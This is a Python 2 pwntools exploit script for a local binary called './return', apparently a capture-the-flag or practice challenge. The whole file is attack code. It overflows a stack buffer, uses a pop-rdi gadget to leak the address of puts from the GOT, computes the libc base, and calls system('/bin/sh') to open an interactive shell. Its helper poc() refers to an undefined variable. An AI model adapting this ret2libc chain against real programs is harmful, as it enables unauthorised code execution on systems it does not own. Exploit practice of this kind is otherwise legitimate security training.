#!/usr/bin/python
# coding: utf-8

from pwn import *

poprdi = 0x0000000000400783
main_addr = 0x0000000000400683
func = 0x0000000000400666

def poc():
    payload = "A" * 0x20
    payload += "B" * 8
    payload += p64(func)

    p.sendline(payload)
    print p.recv(1024)


def main():
    e = ELF("./return")
    libc = e.libc
    p = process(e.path)

    p.recvuntil('Can you call system function??\n')

    payload = "A" * 0x20
    payload += "B" * 8

    payload += p64(poprdi)
    payload += p64(e.got['puts'])
    payload += p64(e.plt['puts'])

    payload += p64(main_addr)
    p.sendline(payload)

    p.recvuntil("You can call system function!!\n")

    puts_got = u64(p.recvline()[:-1].ljust(8, '\x00'))
    log.success("puts : {0}".format(hex(puts_got)))

    libcbase = puts_got - libc.symbols['puts']
    system = libcbase + libc.symbols['system']
    binsh = libcbase + libc.search("/bin/sh\x00").next()

    log.success("libcbase : {0}".format(hex(libcbase)))
    log.success("system : {0}".format(hex(system)))
    log.success("&/bin/sh : {0}".format(hex(binsh)))

    payload = "A" * 0x20
    payload += "B" * 8
    payload += p64(poprdi)
    payload += p64(binsh)
    payload += p64(e.plt['puts'])
    payload += p64(poprdi)
    payload += p64(binsh)
    payload += p64(system)

    p.sendline(payload)

    res = p.recvuntil('/bin/sh')
    if '/bin/sh' in res:
        log.success("Leak successfully!")
    p.interactive()


if __name__ == '__main__':
    main()

